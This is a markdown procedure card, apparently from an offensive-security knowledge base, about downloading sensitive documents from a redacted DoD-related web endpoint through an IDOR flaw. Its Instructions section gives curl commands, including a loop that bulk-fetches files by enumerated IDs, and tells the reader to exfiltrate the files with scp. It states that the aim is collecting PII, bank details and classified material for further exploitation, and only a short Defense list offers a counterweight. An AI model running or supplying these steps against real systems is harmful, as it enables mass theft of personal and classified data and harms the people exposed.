---
id: p3c4d5e6-f7g8-9012-cdef-3456789012
name: Download Sensitive Documents via IDOR
tags:
  - idor
  - pii
  - exfiltration
  - collection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-download-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:34.631Z'
skill_level: beginner
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Download Sensitive Documents via IDOR

## Summary

This procedure focuses on downloading and exfiltrating sensitive files exposed by the IDOR vulnerability, including PII of DoD users and soldiers, contracts, and classified materials.

## Description

Once valid IDs are enumerated, attackers can systematically download files from the endpoint, which serves content like addresses, mobile numbers, emails, bank details, and classified docs without any access restrictions.

## Requirements

1. List of valid IDs from enumeration
2. Sufficient storage for multiple files
3. Secure channel for exfiltration if needed

## Defense

Defensive measures and detection strategies:

- Encrypt sensitive documents and require decryption keys tied to user sessions
- Audit logs for download patterns and integrate with SIEM for anomaly detection
- Use access control lists (ACLs) to restrict object access

## Objectives

1. Collect PII and classified data
2. Assess impact of the vulnerability
3. Prepare data for analysis or further exploitation

## Instructions

### Step 1: Bulk Download Valid Files

**Context**: Use enumerated IDs to fetch all accessible documents.

**Command** ([[commands/curl-download-file]]):
```bash
curl -o sensitive_doc.pdf "https://www.█████████/Download.aspx?id=5000"
# For multiple IDs from a file
while read id; do curl -o doc_${id}.pdf "https://www.█████████/Download.aspx?id=${id}"; done < valid_ids.txt
```

> This retrieves files; inspect for PII like full addresses, phones, and financial info.

### Step 2: Verify and Exfiltrate

**Context**: Review contents and transfer data securely.

Manually inspect files; use scp or similar for exfiltration.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-download-file]]

## Tools Used

- [[tools/curl]]

## Tags

- idor
- download
- pii
